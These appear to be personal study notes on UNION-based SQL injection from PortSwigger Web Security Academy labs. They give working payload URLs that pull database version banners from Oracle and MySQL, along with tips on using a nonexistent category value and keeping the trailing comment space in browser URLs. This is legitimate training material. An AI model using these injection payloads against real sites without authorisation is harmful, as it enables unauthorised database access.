## Union Based Attack

1. in the __UNION__ based attack [here](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle) sometimes, instead of querying legitimate items and then appending the PAYLOAD, i.e,:

```
https://0ad300a7040643f78077034d00f6002d.web-security-academy.net/filter?category=gifts%27%20Union%20Select%20null,banner%20from%20v$version%20--
```

sometimes just querying something that doesnt exist will leave entire webpage to display just the output of payload we injected:

```
https://0ad300a7040643f78077034d00f6002d.web-security-academy.net/filter?category=BLAHLBLAH%27%20Union%20Select%20null,banner%20from%20v$version%20--
```

see how I did __BLAHBLAH__

<br>

2. Many-a-times, while trying to comment directly in the url bar in browser, the space after two hyphens `-- ` is NOT registered!

this can lead to confusion as if the paylod is not working. Since everything after the `-- ` is commented, add something for the space to be registered

```
https://0a0b00af0426bc5b80a10d8c0030007a.web-security-academy.net/filter?category=qqs%27%20union%20select%20null,@@version%20--%20somethingAfterSpace
```

here after space I added __somethingAfterSpace__. We can just add a single chracter as well.

This happened to me while exploiting a MYSQL based Union attack.


## THIS 🔥

>_All modern databases provide ways to examine the database structure, and determine what tables and columns they contain._
